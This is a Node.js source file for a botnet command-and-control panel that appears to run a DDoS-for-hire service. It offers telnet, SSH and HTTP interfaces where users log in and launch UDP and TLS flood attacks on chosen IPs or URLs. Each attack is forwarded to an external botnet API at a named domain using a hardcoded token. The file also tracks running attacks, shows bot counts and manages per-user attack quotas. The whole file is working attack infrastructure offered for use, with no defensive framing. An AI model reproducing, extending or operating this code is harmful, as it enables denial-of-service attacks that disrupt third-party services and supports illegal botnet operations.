const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const net = require('net');
const os = require('os');
const { Server } = require('ssh2');

const app = express();
const PORT = process.env.PORT || 1337;
const SSH_PORT = 22;

process.on('uncaughtException', (err) => {
    console.log(`\x1b[31m[✗] exception → ${err.message.toLowerCase()}\x1b[0m`);
});

process.on('unhandledRejection', (err) => {
    console.log(`\x1b[31m[✗] rejection → ${err.toString().toLowerCase()}\x1b[0m`);
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const CONFIG_DIR = path.join(__dirname, 'config');
if (!fs.existsSync(CONFIG_DIR)) fs.mkdirSync(CONFIG_DIR, { recursive: true });

function cfgPath(file) {
    return path.join(CONFIG_DIR, file);
}

function loadJson(filePath, fallback = {}) {
    try {
        if (fs.existsSync(filePath)) {
            const raw = fs.readFileSync(filePath, 'utf8').trim();
            return raw ? JSON.parse(raw) : fallback;
        }
    } catch (_) { }
    return fallback;
}

function saveJson(filePath, data) {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
}

const paths = {
    methods: cfgPath('methods.json'),
    users: cfgPath('users.json')
};

const defaults = {
    methods: [],
    users: {}
};

Object.entries(paths).forEach(([key, p]) => {
    if (!fs.existsSync(p)) fs.writeFileSync(p, JSON.stringify(defaults[key], null, 2));
});

const state = {
    methods: loadJson(paths.methods),
    users: loadJson(paths.users),
    runningAttacks: new Map(),
    attackCounter: 0
};

function getLocalIP() {
    const nets = os.networkInterfaces();
    for (const name of Object.keys(nets)) {
        for (const net of nets[name]) {
            if (net.family === 'IPv4' && !net.internal) {
                return net.address;
            }
        }
    }
    return '127.0.0.1';
}

const VPS_IP = getLocalIP();

const BOTNET_API = 'https://botnet.atlastresser.site';

function rgb(r, g, b) {
    return `\x1b[38;2;${r};${g};${b}m`;
}

function violet(text) {
    return `${rgb(180, 130, 255)}${text}\x1b[0m`;
}

function green(text) {
    return `${rgb(100, 220, 160)}${text}\x1b[0m`;
}

function red(text) {
    return `${rgb(255, 100, 120)}${text}\x1b[0m`;
}

function yellow(text) {
    return `${rgb(255, 220, 80)}${text}\x1b[0m`;
}

function cyan(text) {
    return `${rgb(100, 200, 255)}${text}\x1b[0m`;
}

function bold(text) {
    return `\x1b[1m${text}\x1b[0m`;
}

function dim(text) {
    return `\x1b[2m${text}\x1b[0m`;
}

function getPrompt(session) {
    const user = session.user ? session.user.username : 'root';
    const host = 'tanxio';
    return `${rgb(100, 200, 255)}${user}${rgb(200, 200, 200)}@${rgb(180, 130, 255)}${host}${rgb(200, 200, 200)}~# `;
}

function write(session, text) {
    if (session.socket) {
        session.socket.write(text);
    } else {
        process.stdout.write(text);
    }
}

function writeLine(session, text) {
    write(session, text + '\r\n');
}

async function login(session, username, password) {
    const user = state.users[username];
    if (!user) return false;
    if (user.password !== password) return false;
    session.user = user;
    return true;
}

async function sendStopToAPI(id) {
    try {
        const apiUrl = BOTNET_API + '/stop?token=asulama&id=' + id;
        const response = await axios.get(apiUrl, { timeout: 10000 });
        return {
            success: response.data?.status === 'success',
            data: response.data
        };
    } catch (error) {
        if (error.response) {
            return { success: false, error: error.response.data?.message || error.response.statusText };
        }
        return { success: false, error: error.message };
    }
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function showLoading(session, message) {
    let dots = 0;
    const interval = setInterval(() => {
        dots = (dots + 1) % 4;
        const loading = '.'.repeat(dots) + ' '.repeat(3 - dots);
        write(session, '\r  ' + dim(message) + ' ' + cyan(loading) + '   ');
    }, 200);
    return {
        stop: () => {
            clearInterval(interval);
            write(session, '\r' + ' '.repeat(60) + '\r');
        }
    };
}

async function sendAttackToAPI(session, method, target, time, slot, port) {
    const loader = showLoading(session, 'Launching attack');
    await delay(3000);
    loader.stop();
    
    try {
        const methodData = state.methods.find(m => m.name.toLowerCase() === method.toLowerCase());
        if (!methodData) {
            return { success: false, error: 'Method not found' };
        }

        let apiUrl = methodData.api
            .replace('<<$host>>', encodeURIComponent(target))
            .replace('<<$time>>', time)
            .replace('<<$slot>>', slot || '')
            .replace('<<$port>>', port || '');

        const response = await axios.get(apiUrl, { timeout: 10000 });

        if (response.data?.status === 'error') {
            return { success: false, error: response.data.message || 'API error' };
        }

        return {
            success: true,
            data: response.data
        };
    } catch (error) {
        if (error.response) {
            return {
                success: false,
                error: error.response.data?.message || error.response.statusText
            };
        }
        if (error.code === 'ECONNREFUSED') {
            return { success: false, error: 'Connection refused' };
        }
        return { success: false, error: error.message };
    }
}

async function getBotsInfo() {
    try {
        const response = await axios.get(BOTNET_API, { timeout: 5000 });
        return response.data;
    } catch (error) {
        return null;
    }
}

function cmdHelp(session) {
    writeLine(session, '');
    writeLine(session, '  ' + bold('Commands:'));
    writeLine(session, '');
    writeLine(session, '  ' + violet('!login') + ' <username> <password>     ' + dim('Login to CNC'));
    writeLine(session, '  ' + violet('!methods') + '                        ' + dim('Show available methods'));
    writeLine(session, '  ' + violet('!udp') + ' <ip> <port> <time> <slot>   ' + dim('UDP attack (L4)'));
    writeLine(session, '  ' + violet('!tls-f') + ' <url> <time> <slot>       ' + dim('TLS flood attack (L7)'));
    writeLine(session, '  ' + violet('!<method>') + ' <target> <time> <slot> ' + dim('Direct method attack'));
    writeLine(session, '  ' + violet('!ongoing') + '                        ' + dim('Show your running attacks'));
    writeLine(session, '  ' + violet('!stop') + ' <id>                       ' + dim('Stop an attack'));
    writeLine(session, '  ' + violet('!bots') + '                            ' + dim('Show botnet info'));
    writeLine(session, '');
    writeLine(session, '  ' + bold('Admin Commands:'));
    writeLine(session, '');
    writeLine(session, '  ' + violet('!users') + ' add <user> <pass>         ' + dim('Add new user'));
    writeLine(session, '  ' + violet('!users') + ' ongoing                   ' + dim('Show all users attacks'));
    writeLine(session, '  ' + violet('!users') + ' edit <user>                ' + dim('Edit user plan'));
    writeLine(session, '  ' + violet('!users') + ' list                       ' + dim('List all users'));
    writeLine(session, '  ' + violet('!users') + ' delete <user>              ' + dim('Delete user'));
    writeLine(session, '');
}

function cmdMethods(session) {
    writeLine(session, '');
    writeLine(session, '  ' + bold('Available Methods:'));
    writeLine(session, '');
    state.methods.forEach(m => {
        const name = violet(m.name);
        const desc = dim('[' + m.desripsi + ']');
        const perm = m.permission ? m.permission.join(', ') : 'all';
        writeLine(session, '    ' + name + ' ' + desc + ' ' + dim('(' + perm + ')'));
    });
    writeLine(session, '');
}

async function cmdUdp(session, args) {
    const [ip, port, time, slot] = args;
    if (!ip || !port || !time || !slot) {
        writeLine(session, '  ' + red('Usage:') + ' !udp <ip> <port> <time> <slot>');
        return;
    }

    writeLine(session, '  ' + dim('Sending attacks...'));
    const result = await sendAttackToAPI(session, 'udpplain', ip, parseInt(time), parseInt(slot), port);

    if (result.success) {
        const apiData = result.data?.data || result.data || {};
        const attackId = apiData.id || `atk_${++state.attackCounter}`;
        
        state.runningAttacks.set(attackId, {
            id: attackId,
            user: session.user ? session.user.username : 'unknown',
            method: 'udpplain',
            target: ip,
            port: port,
            time: parseInt(time),
            slot: parseInt(slot),
            startedAt: Date.now()
        });

        const totalDevice = apiData.total_nodes || apiData.servers || apiData.bots || 0;
        writeLine(session, '  ' + green('Successfully sent to') + ' ' + violet(totalDevice) + ' ' + green('device(s)'));
        writeLine(session, '');
    } else {
        writeLine(session, '  ' + red('[✗]') + ' ' + result.error);
    }
}

async function cmdTlsF(session, args) {
    const [url, time, slot] = args;
    if (!url || !time || !slot) {
        writeLine(session, '  ' + red('Usage:') + ' !tls-f <url> <time> <slot>');
        return;
    }

    writeLine(session, '  ' + dim('Sending attacks...'));
    const result = await sendAttackToAPI(session, 'tls-f', url, parseInt(time), parseInt(slot));

    if (result.success) {
        const apiData = result.data?.data || result.data || {};
        const attackId = apiData.id || `atk_${++state.attackCounter}`;
        
        state.runningAttacks.set(attackId, {
            id: attackId,
            user: session.user ? session.user.username : 'unknown',
            method: 'tls-f',
            target: url,
            time: parseInt(time),
            slot: parseInt(slot),
            startedAt: Date.now()
        });

        const totalDevice = apiData.total_nodes || apiData.servers || apiData.bots || 0;
        writeLine(session, '  ' + green('Successfully sent to') + ' ' + violet(totalDevice) + ' ' + green('device(s)'));
        writeLine(session, '');
    } else {
        writeLine(session, '  ' + red('[✗]') + ' ' + result.error);
    }
}

async function cmdDirectAttack(session, method, args) {
    const [target, time, slot] = args;
    if (!target || !time || !slot) {
        writeLine(session, '  ' + red('Usage:') + ' !' + method + ' <target> <time> <slot>');
        return;
    }

    const methodData = state.methods.find(m => m.name.toLowerCase() === method.toLowerCase());
    const isL4 = methodData && methodData.desripsi === 'Layer 4';

    let targetUrl;
    if (isL4) {
        targetUrl = target.replace(/^https?:\/\//, '').replace(/^www\./, '');
    } else {
        targetUrl = target;
    }

    if (isL4) {
        writeLine(session, '  ' + red('Error:') + ' L4 methods require port. Use !udp <ip> <port> <time> <slot>');
        return;
    }

    writeLine(session, '  ' + dim('Sending attacks...'));
    const result = await sendAttackToAPI(session, method, targetUrl, parseInt(time), parseInt(slot));

    if (result.success) {
        const apiData = result.data?.data || result.data || {};
        const attackId = apiData.id || `atk_${++state.attackCounter}`;
        
        state.runningAttacks.set(attackId, {
            id: attackId,
            user: session.user ? session.user.username : 'unknown',
            method: method,
            target: targetUrl,
            time: parseInt(time),
            slot: parseInt(slot),
            startedAt: Date.now()
        });

        const totalDevice = apiData.total_nodes || apiData.servers || apiData.bots || 0;
        writeLine(session, '  ' + green('Successfully sent to') + ' ' + violet(totalDevice) + ' ' + green('device(s)'));
        writeLine(session, '');
    } else {
        writeLine(session, '  ' + red('[✗]') + ' ' + result.error);
    }
}

async function cmdOngoing(session) {
    writeLine(session, '');
    writeLine(session, '  ' + bold('Running Attacks:'));
    writeLine(session, '');

    let found = false;
    state.runningAttacks.forEach((atk, id) => {
        if (session.user.username === 'admin' || atk.user === session.user.username) {
            found = true;
            const elapsed = Math.floor((Date.now() - atk.startedAt) / 1000);
            const remaining = Math.max(0, atk.time - elapsed);
            const targetDisplay = atk.port ? atk.target + ':' + atk.port : atk.target;
            writeLine(session, '  ' + violet(id) + '  ' + atk.method + '  ' + targetDisplay + '  ' + dim(remaining + 's remaining'));
        }
    });

    if (!found) {
        writeLine(session, '  ' + dim('No running attacks'));
    }
    writeLine(session, '');
}

async function cmdStop(session, args) {
    const [id] = args;
    if (!id) {
        writeLine(session, '  ' + red('Usage:') + ' !stop <id>');
        return;
    }

    const attack = state.runningAttacks.get(id);
    if (!attack) {
        writeLine(session, '  ' + red('Error:') + ' Attack ID not found');
        return;
    }

    if (session.user.username !== 'admin' && attack.user !== session.user.username) {
        writeLine(session, '  ' + red('Error:') + ' This attack does not belong to you');
        return;
    }

    state.runningAttacks.delete(id);
    writeLine(session, '  ' + green('[✓]') + ' Attack ' + id + ' stopped');
}

async function cmdBots(session) {
    const info = await getBotsInfo();
    
    writeLine(session, '');
    writeLine(session, '  ' + bold('Botnet Status:'));
    writeLine(session, '');

    if (info) {
        writeLine(session, '  ' + dim('Status:') + ' ' + green('Online'));
        writeLine(session, '  ' + dim('Total Nodes:') + ' ' + violet(info.nodes || 0));
        writeLine(session, '  ' + dim('Online Bots:') + ' ' + violet(info.botnet?.online || 0));
        writeLine(session, '  ' + dim('Total Bots:') + ' ' + violet(info.botnet?.total || 0));
        if (info.architectures) {
            writeLine(session, '');
            writeLine(session, '  ' + bold('Architecture:'));
            Object.entries(info.architectures).forEach(([arch, count]) => {
                writeLine(session, '    ' + violet(arch) + '  ' + count);
            });
        }
    } else {
        writeLine(session, '  ' + dim('Status:') + ' ' + red('Offline/Unavailable'));
        writeLine(session, '  ' + dim('Could not connect to botnet.atlastresser.site'));
    }
    writeLine(session, '');
}

async function cmdUsers(session, subcmd, args) {
    if (!session.user || session.user.role !== 'admin') {
        writeLine(session, '  ' + red('Error:') + ' Admin access required');
        return;
    }

    switch (subcmd) {
        case 'add': {
            const [username, password] = args;
            if (!username || !password) {
                writeLine(session, '  ' + red('Usage:') + ' !users add <username> <password>');
                return;
            }
            if (state.users[username]) {
                writeLine(session, '  ' + red('Error:') + ' User already exists');
                return;
            }
            state.users[username] = {
                username,
                password,
                role: 'user',
                timelimit: 3600,
                slot: 10,
                cooldown: 60,
                createdAt: new Date().toISOString()
            };
            saveJson(paths.users, state.users);
            writeLine(session, '  ' + green('[✓]') + ' User ' + violet(username) + ' added successfully');
            break;
        }

        case 'list': {
            writeLine(session, '');
            writeLine(session, '  ' + bold('Users List:'));
            writeLine(session, '');
            Object.values(state.users).forEach(u => {
                const role = u.role === 'admin' ? violet('[ADMIN]') : dim('[USER]');
                writeLine(session, '    ' + violet(u.username) + ' ' + role + ' ' + dim('(timelimit: ' + u.timelimit + 's, slot: ' + u.slot + ', cd: ' + u.cooldown + 's)'));
            });
            writeLine(session, '');
            break;
        }

        case 'ongoing': {
            writeLine(session, '');
            writeLine(session, '  ' + bold('All Users Running Attacks:'));
            writeLine(session, '');
            if (state.runningAttacks.size === 0) {
                writeLine(session, '  ' + dim('No running attacks'));
            } else {
                state.runningAttacks.forEach((atk, id) => {
                    const elapsed = Math.floor((Date.now() - atk.startedAt) / 1000);
                    const remaining = Math.max(0, atk.time - elapsed);
                    writeLine(session, '  ' + violet(id) + '  ' + dim(atk.user) + '  ' + atk.method + '  ' + atk.target + '  ' + dim(remaining + 's'));
                });
            }
            writeLine(session, '');
            break;
        }

        case 'timelimit': {
            const [username, value] = args;
            if (!username || !value) {
                writeLine(session, '  ' + red('Usage:') + ' !users edit <username> timelimit <value>');
                return;
            }
            if (!state.users[username]) {
                writeLine(session, '  ' + red('Error:') + ' User not found');
                return;
            }
            state.users[username].timelimit = parseInt(value);
            saveJson(paths.users, state.users);
            writeLine(session, '  ' + green('[✓]') + ' User ' + violet(username) + ' timelimit updated to ' + violet(value) + 's');
            break;
        }

        case 'slot': {
            const [username, value] = args;
            if (!username || !value) {
                writeLine(session, '  ' + red('Usage:') + ' !users edit <username> slot <value>');
                return;
            }
            if (!state.users[username]) {
                writeLine(session, '  ' + red('Error:') + ' User not found');
                return;
            }
            state.users[username].slot = parseInt(value);
            saveJson(paths.users, state.users);
            writeLine(session, '  ' + green('[✓]') + ' User ' + violet(username) + ' slot updated to ' + violet(value));
            break;
        }

        case 'cooldown': {
            const [username, value] = args;
            if (!username || !value) {
                writeLine(session, '  ' + red('Usage:') + ' !users edit <username> cooldown <value>');
                return;
            }
            if (!state.users[username]) {
                writeLine(session, '  ' + red('Error:') + ' User not found');
                return;
            }
            state.users[username].cooldown = parseInt(value);
            saveJson(paths.users, state.users);
            writeLine(session, '  ' + green('[✓]') + ' User ' + violet(username) + ' cooldown updated to ' + violet(value) + 's');
            break;
        }

        case 'role': {
            const [username, value] = args;
            if (!username || !value) {
                writeLine(session, '  ' + red('Usage:') + ' !users edit <username> role <admin|user>');
                return;
            }
            if (!state.users[username]) {
                writeLine(session, '  ' + red('Error:') + ' User not found');
                return;
            }
            if (value !== 'admin' && value !== 'user') {
                writeLine(session, '  ' + red('Error:') + ' Role must be \'admin\' or \'user\'');
                return;
            }
            state.users[username].role = value;
            saveJson(paths.users, state.users);
            writeLine(session, '  ' + green('[✓]') + ' User ' + violet(username) + ' role updated to ' + violet(value));
            break;
        }

        case 'delete': {
            const [username] = args;
            if (!username) {
                writeLine(session, '  ' + red('Usage:') + ' !users delete <username>');
                return;
            }
            if (!state.users[username]) {
                writeLine(session, '  ' + red('Error:') + ' User not found');
                return;
            }
            delete state.users[username];
            saveJson(paths.users, state.users);
            writeLine(session, '  ' + green('[✓]') + ' User ' + violet(username) + ' deleted');
            break;
        }

        default: {
            writeLine(session, '');
            writeLine(session, '  ' + bold('Users Management:'));
            writeLine(session, '');
            writeLine(session, '  ' + violet('!users') + ' add <user> <pass>');
            writeLine(session, '  ' + violet('!users') + ' list');
            writeLine(session, '  ' + violet('!users') + ' ongoing');
            writeLine(session, '  ' + violet('!users') + ' timelimit <user> <value>');
            writeLine(session, '  ' + violet('!users') + ' slot <user> <value>');
            writeLine(session, '  ' + violet('!users') + ' cooldown <user> <value>');
            writeLine(session, '  ' + violet('!users') + ' role <user> <admin|user>');
            writeLine(session, '  ' + violet('!users') + ' delete <user>');
            writeLine(session, '');
        }
    }
}

async function handleCommand(session, input) {
    const trimmed = input.trim();
    if (!trimmed) return;

    if (trimmed.startsWith('!')) {
        const parts = trimmed.slice(1).split(/\s+/);
        const cmd = parts[0].toLowerCase();
        const args = parts.slice(1);

        switch (cmd) {
            case 'login': {
                const [username, password] = args;
                if (!username || !password) {
                    writeLine(session, '  ' + red('Usage:') + ' !login <username> <password>');
                    return;
                }
                const success = await login(session, username, password);
                if (success) {
                    writeLine(session, '  ' + green('[✓]') + ' Logged in as ' + violet(username));
                } else {
                    writeLine(session, '  ' + red('[✗]') + ' Invalid credentials');
                }
                break;
            }

            case 'logout': {
                session.user = null;
                writeLine(session, '  ' + dim('Logged out'));
                break;
            }

            case 'clear': {
                write(session, '\x1Bc');
                break;
            }

            case 'help': {
                cmdHelp(session);
                break;
            }

            case 'methods': {
                cmdMethods(session);
                break;
            }

            case 'udp': {
                if (!session.user) {
                    writeLine(session, '  ' + red('Error:') + ' Please login first');
                    return;
                }
                await cmdUdp(session, args);
                break;
            }

            case 'tls-f': {
                if (!session.user) {
                    writeLine(session, '  ' + red('Error:') + ' Please login first');
                    return;
                }
                await cmdTlsF(session, args);
                break;
            }

            case 'stop': {
                if (!session.user) {
                    writeLine(session, '  ' + red('Error:') + ' Please login first');
                    return;
                }
                await cmdStop(session, args);
                break;
            }

            case 'ongoing': {
                if (!session.user) {
                    writeLine(session, '  ' + red('Error:') + ' Please login first');
                    return;
                }
                await cmdOngoing(session);
                break;
            }

            case 'bots': {
                await cmdBots(session);
                break;
            }

            case 'users': {
                const subcmd = args[0] ? args[0].toLowerCase() : '';
                await cmdUsers(session, subcmd, args.slice(1));
                break;
            }

            default: {
                if (!session.user) {
                    writeLine(session, '  ' + dim('Type') + ' ' + violet('!help') + ' ' + dim('for available commands'));
                    return;
                }
                const method = state.methods.find(m => m.name.toLowerCase() === cmd);
                if (method) {
                    await cmdDirectAttack(session, cmd, args);
                } else {
                    writeLine(session, '  ' + red('Unknown command:') + ' !' + cmd);
                }
            }
        }
    }
}

function createSession(socket) {
    return {
        socket: socket,
        user: null,
        buffer: ''
    };
}

function startLocalTerminal() {
    const session = createSession(null);

    process.stdout.write('\x1Bc');
    console.log('');
    console.log('  ' + bold(violet('TANXIO CNC') + ' ' + dim('v2.0.0')));
    console.log('  ' + dim('Type') + ' ' + violet('!help') + ' ' + dim('for available commands'));
    console.log('');

    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout,
        prompt: getPrompt(session)
    });

    rl.on('line', async (input) => {
        await handleCommand(session, input);
        rl.setPrompt(getPrompt(session));
        rl.prompt();
    });

    rl.on('close', () => {
        console.log('  ' + dim('Goodbye!'));
        process.exit(0);
    });

    rl.prompt();
}

function startNetServer() {
    const netServer = net.createServer((socket) => {
        const remoteIp = socket.remoteAddress;
        console.log('  ' + green('[+]') + ' New connection from ' + cyan(remoteIp));

        const session = createSession(socket);
        let loginStep = 'user';
        let loginUser = '';
        let loginPass = '';
        let isLoggedIn = false;

        function showLoginScreen() {
            socket.write('\x1Bc');
            socket.write('\x1b[41m'); // red background
            socket.write('\n');
            socket.write('  ╔══════════════════════════════════════════════════╗\n');
            socket.write('  ║                                                  ║\n');
            socket.write('  ║           ██████╗  ██████╗ ██████╗ ██████╗      ║\n');
            socket.write('  ║           ██╔══██╗██╔═══██╗██╔══██╗██╔══██╗     ║\n');
            socket.write('  ║           ██████╔╝██║   ██║██████╔╝██████╔╝     ║\n');
            socket.write('  ║           ██╔═══╝ ██║   ██║██╔══██╗██╔══██╗     ║\n');
            socket.write('  ║           ██║     ╚██████╔╝██║  ██║██║  ██║     ║\n');
            socket.write('  ║           ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝     ║\n');
            socket.write('  ║                                                  ║\n');
            socket.write('  ╚══════════════════════════════════════════════════╝\n');
            socket.write('\x1b[0m'); // reset
            socket.write('\n');
            socket.write('  \x1b[1m\x1b[38;2;255;100;100mUSERNAME:\x1b[0m ');
            session.buffer = '';
        }

        function handleLoginInput(data) {
            const input = data.toString();
            for (const char of input) {
                if (char === '\r' || char === '\n') {
                    if (loginStep === 'user') {
                        loginUser = session.buffer.trim();
                        session.buffer = '';
                        socket.write('\n');
                        socket.write('  \x1b[1m\x1b[38;2;255;100;100mPASSWORD:\x1b[0m ');
                        loginStep = 'pass';
                    } else if (loginStep === 'pass') {
                        loginPass = session.buffer.trim();
                        socket.write('\n');
                        
                        const user = state.users[loginUser];
                        if (user && user.password === loginPass) {
                            session.user = user;
                            isLoggedIn = true;
                            socket.write('\n');
                            socket.write('  \x1b[38;2;100;220;160m[✓]\x1b[0m Login successful as \x1b[38;2;180;130;255m' + loginUser + '\x1b[0m\n');
                            socket.write('\n');
                            socket.write('  Type \x1b[38;2;180;130;255m!help\x1b[0m for available commands\n');
                            socket.write('\n');
                            socket.write(getPrompt(session));
                            
                            socket.removeAllListeners('data');
                            socket.on('data', handleTerminalInput);
                        } else {
                            socket.write('  \x1b[38;2;255;100;120m[✗]\x1b[0m Invalid credentials\n');
                            socket.write('\n');
                            loginUser = '';
                            loginPass = '';
                            loginStep = 'user';
                            showLoginScreen();
                        }
                    }
                } else if (char === '\x7f' || char === '\x08') {
                    if (session.buffer.length > 0) {
                        session.buffer = session.buffer.slice(0, -1);
                        socket.write('\b \b');
                    }
                } else if (char >= ' ' && char <= '~') {
                    if (loginStep === 'pass') {
                        session.buffer += char;
                        socket.write('*');
                    } else {
                        session.buffer += char;
                        socket.write(char);
                    }
                }
            }
        }

        function handleTerminalInput(data) {
            const input = data.toString();
            for (const char of input) {
                if (char === '\r' || char === '\n') {
                    if (session.buffer.trim()) {
                        handleCommand(session, session.buffer.trim());
                    }
                    session.buffer = '';
                    socket.write(getPrompt(session));
                } else if (char === '\x7f' || char === '\x08') {
                    if (session.buffer.length > 0) {
                        session.buffer = session.buffer.slice(0, -1);
                        socket.write('\b \b');
                    }
                } else if (char === '\x03') {
                    socket.write('^C\r\n');
                    session.buffer = '';
                    socket.write(getPrompt(session));
                } else if (char >= ' ' && char <= '~') {
                    session.buffer += char;
                    socket.write(char);
                }
            }
        }

        showLoginScreen();
        socket.on('data', handleLoginInput);

        socket.on('end', () => {
            console.log('  ' + yellow('[-]') + ' Connection closed from ' + cyan(remoteIp));
        });

        socket.on('error', () => {});
    });

    netServer.listen(PORT, () => {
        process.stdout.write('\x1Bc');
        console.log('');
        console.log('  ' + bold(violet('TANXIO CNC') + ' ' + dim('v2.0.0')));
        console.log('');
        console.log('  ' + dim('══════════════════════════════════════════════'));
        console.log('  ' + dim('  IP     :') + ' ' + cyan(VPS_IP));
        console.log('  ' + dim('  SSH    :') + ' ' + violet('ssh <user>@' + VPS_IP + ' -p 22'));
        console.log('  ' + dim('  NETCAT :') + ' ' + violet('nc ' + VPS_IP + ' ' + PORT));
        console.log('  ' + dim('══════════════════════════════════════════════'));
        console.log('');
        console.log('  ' + dim('Methods:') + ' ' + state.methods.length + ' | ' + dim('Users:') + ' ' + Object.keys(state.users).length);
        console.log('');
        startLocalTerminal();
    });
}

const server = app.listen(8080, () => {
    console.log('  ' + dim('HTTP API running on port 8080'));
});

app.get('/', (req, res) => {
    res.json({
        status: 'online',
        type: 'CNC Terminal',
        port: PORT,
        api: BOTNET_API
    });
});

app.get('/attack', async (req, res) => {
    const { target, time, method, port, slot } = req.query;

    if (!target || !time || !method) {
        return res.status(400).json({ status: 'error', message: 'missing parameters (target, time, method)' });
    }

    const result = await sendAttackToAPI(null, method, target, parseInt(time), slot, port);

    if (result.success) {
        const apiData = result.data?.data || result.data || {};
        const attackId = apiData.id || `atk_${++state.attackCounter}`;
        
        state.runningAttacks.set(attackId, {
            id: attackId,
            user: 'api',
            method: method,
            target: target,
            time: parseInt(time),
            slot: parseInt(slot) || 1,
            startedAt: Date.now()
        });

        res.json(result.data);
    } else {
        res.status(400).json({ status: 'error', message: result.error });
    }
});

app.get('/stop', async (req, res) => {
    const { token, id } = req.query;

    if (!token || !id) {
        return res.status(400).json({ status: 'error', message: 'missing parameters' });
    }

    const user = state.users[token];
    if (!user) {
        return res.status(403).json({ status: 'error', message: 'invalid token' });
    }

    const result = await sendStopToAPI(id);
    
    if (result.success) {
        state.runningAttacks.delete(id);
        res.json(result.data);
    } else {
        res.status(400).json({ status: 'error', message: result.error });
    }
});

app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        attacks: state.runningAttacks.size,
        users: Object.keys(state.users).length,
        methods: state.methods.length
    });
});

app.get('/bots', async (req, res) => {
    const info = await getBotsInfo();
    res.json(info || { status: 'unavailable' });
});

setInterval(() => {
    if (state.runningAttacks.size > 0) {
        const now = Date.now();
        state.runningAttacks.forEach((atk, id) => {
            const elapsed = Math.floor((now - atk.startedAt) / 1000);
            if (elapsed >= atk.time) {
                state.runningAttacks.delete(id);
            }
        });
    }
}, 1000);

function startSSHSERVER() {
    const sshServer = new Server({ hostKeys: [fs.readFileSync('/etc/ssh/ssh_host_rsa_key')] }, (client) => {
        let sshUsername = '';
        console.log('  ' + green('[+]') + ' SSH connection from ' + cyan(client._socket.remoteAddress));

        client.on('authentication', (ctx) => {
            const user = state.users[ctx.username];
            if (user && user.password === ctx.password) {
                sshUsername = ctx.username;
                ctx.accept();
            } else {
                ctx.reject();
            }
        }).on('ready', () => {
            console.log('  ' + green('[+]') + ' SSH user authenticated: ' + cyan(sshUsername));

            client.on('session', (accept, reject) => {
                const session = accept();
                
                session.on('pty', (accept, reject, info) => {
                    accept();
                });

                session.on('shell', (accept) => {
                    const stream = accept();
                    const userSession = createSession(null);
                    userSession.user = state.users[sshUsername];
                    stream.write('\x1Bc');
                    stream.write('\x1b[41m');
                    stream.write('\n');
                    stream.write('  ╔══════════════════════════════════════════════════╗\n');
                    stream.write('  ║                                                  ║\n');
                    stream.write('  ║           ██████╗  ██████╗ ██████╗ ██████╗      ║\n');
                    stream.write('  ║           ██╔══██╗██╔═══██╗██╔══██╗██╔══██╗     ║\n');
                    stream.write('  ║           ██████╔╝██║   ██║██████╔╝██████╔╝     ║\n');
                    stream.write('  ║           ██╔═══╝ ██║   ██║██╔══██╗██╔══██╗     ║\n');
                    stream.write('  ║           ██║     ╚██████╔╝██║  ██║██║  ██║     ║\n');
                    stream.write('  ║           ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝     ║\n');
                    stream.write('  ║                                                  ║\n');
                    stream.write('  ╚══════════════════════════════════════════════════╝\n');
                    stream.write('\x1b[0m');
                    stream.write('\n');
                    stream.write('  \x1b[38;2;100;220;160m[✓]\x1b[0m Welcome, \x1b[38;2;180;130;255m' + userSession.user.username + '\x1b[0m\n');
                    stream.write('\n');
                    stream.write('  Type \x1b[38;2;180;130;255m!help\x1b[0m for available commands\n');
                    stream.write('\n');
                    
                    stream.write(getPrompt(userSession));
                    stream.prompt = () => stream.write(getPrompt(userSession));
                    stream.session = userSession;

                    session.on('data', async (data) => {
                        const input = data.toString();
                        for (const char of input) {
                            if (char === '\r' || char === '\n') {
                                if (stream.session.buffer.trim()) {
                                    await handleCommand(stream.session, stream.session.buffer.trim());
                                }
                                stream.session.buffer = '';
                                stream.prompt();
                            } else if (char === '\x7f' || char === '\x08') {
                                if (stream.session.buffer.length > 0) {
                                    stream.session.buffer = stream.session.buffer.slice(0, -1);
                                    stream.write('\b \b');
                                }
                            } else if (char === '\x03') {
                                stream.write('^C\r\n');
                                stream.session.buffer = '';
                                stream.prompt();
                            } else if (char >= ' ' && char <= '~') {
                                stream.session.buffer += char;
                                stream.write(char);
                            }
                        }
                    });

                    session.on('eof', () => {
                        console.log('  ' + yellow('[-]') + ' SSH session closed');
                    });
                });
            });

            client.on('close', () => {
                console.log('  ' + yellow('[-]') + ' SSH client disconnected');
            });
        });
    });

    sshServer.listen(SSH_PORT, () => {
        console.log('  ' + dim('SSH Server:') + ' ' + cyan('port ' + SSH_PORT));
        console.log('  ' + dim('Connect:') + ' ' + violet('ssh <user>@' + VPS_IP + ' -p ' + SSH_PORT));
        console.log('');
    });

    sshServer.on('error', (err) => {
        console.log('  ' + dim('SSH:') + ' ' + red(err.message) + ' (run: sudo apt install openssh && ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key)');
    });
}

startSSHSERVER();
startNetServer();
